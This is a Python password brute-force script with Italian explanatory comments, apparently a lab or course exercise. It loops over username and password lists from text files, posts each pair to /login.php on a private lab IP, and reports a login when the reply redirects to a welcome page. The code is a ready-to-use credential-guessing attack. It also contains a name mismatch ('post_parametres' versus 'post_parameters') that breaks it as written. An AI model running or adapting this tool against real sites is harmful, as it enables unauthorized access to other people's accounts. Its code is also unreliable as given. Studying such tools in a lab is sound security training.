import http.client , urllib.parse

username_file = open('nomi_utenti.txt')
password_file = open ('password.txt')

user_list = username_file.readlines()
pwd_list = password_file.readlines()

for user in user_list:
	user = user.rstrip()
	for pwd in pwd_list:
		pwd = pwd.rstrip()

		print (user,"-",pwd)

		post_parametres = urllib.parse.urlencode({'username': user, 'password' : pwd,'Submit': "Submit"})
		headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/html,application/xhtml+xml"}
		conn = http.client.HTTPConnection("192.168.56.102",80)
		conn.request("POST", "/login.php", post_parameters, headers)
		response = conn.getresponse()

		if(response.getheader('location') == "benvenuto.php"):
			print("Logged with:",user,"-",pwd)


#Relazione
#la prima riga ci serve per caricare i moduli, in questo caso il modulo http.client e urllib.parse per utilizzare le loro funzioni
#poi abbiamo crato due variabili assegnando loro due file di testo uno per i nomi utente e l altro per le password 
#con la funzione open si apre il file, invece con la funzione readlines copiamo il contenuto del file nelle variabili 
#con il primo  ciclo for si provano tutte le combinazioni possibili tra utente e password, con il secondo si testano per ogni utente
#tutte le password
#nella variabile post_parametres vengono inseriti i valori utente e password che sono inviati tramite post all login
#con la variabile conn andiamo a stabilire la connesione con la coppia ip/porta in questo caso http perche utilizza la porta 80
#se il nuome utente e password sono esatte ci farà entrare nel sito altrimenti ritornera nel login e riprovera con un
#nuovo utente e password
#il tutto si ripete finche non trova i dati giusti da inserire nel login 
